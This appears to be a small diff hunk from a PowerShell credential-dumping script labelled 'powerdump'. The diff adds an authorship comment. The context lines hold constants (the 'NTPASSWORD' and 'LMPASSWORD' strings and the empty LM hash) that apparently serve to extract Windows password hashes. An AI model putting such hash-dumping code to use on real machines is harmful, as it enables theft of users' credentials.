@@ -120,6 +120,8 @@ function LoadApi
     $script:PowerDump = $TypeBuilder.CreateType()
 }
 
+#######################################powerdump written by David Kennedy#########################################
+
 $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
 $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
 $empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
